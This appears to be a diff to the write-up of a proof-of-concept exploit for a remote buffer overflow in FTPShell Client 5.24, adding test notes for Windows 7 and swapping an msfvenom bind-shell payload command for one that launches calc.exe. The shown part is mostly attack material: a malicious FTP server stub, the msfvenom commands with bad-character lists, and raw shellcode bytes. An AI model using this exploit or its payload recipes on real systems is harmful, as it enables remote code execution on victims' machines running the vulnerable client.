@@ -4,6 +4,8 @@
 
 ## Description
 FTPShell Client 5.24 Remote Buffer Overflow
+Tested on Windows 7 enterprise 32bit
+Target EIP address should be revised according to each platforms..
 
 ## PoC
 ```python
@@ -15,7 +17,7 @@ def exploit(args):
     module.log("[*] CT-Zer0 Evil FTP Server Listening port 21\n")
 
     # \x00\x0a\x0d\x22\xff
-    # msfvenom -p windows/shell_bind_tcp LPORT=5656 -f c -b '\x00\x0a\x0d\x22\xff'
+    # msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d\x22\xff'
     shellcode = ("\xdd\xc4\xd9\x74\x24\xf4\xbe\x28\xda\xdf\x59\x5a\x29\xc9\xb1"
     "\x31\x31\x72\x18\x83\xea\xfc\x03\x72\x3c\x38\x2a\xa5\xd4\x3e"
     "\xd5\x56\x24\x5f\x5f\xb3\x15\x5f\x3b\xb7\x05\x6f\x4f\x95\xa9"
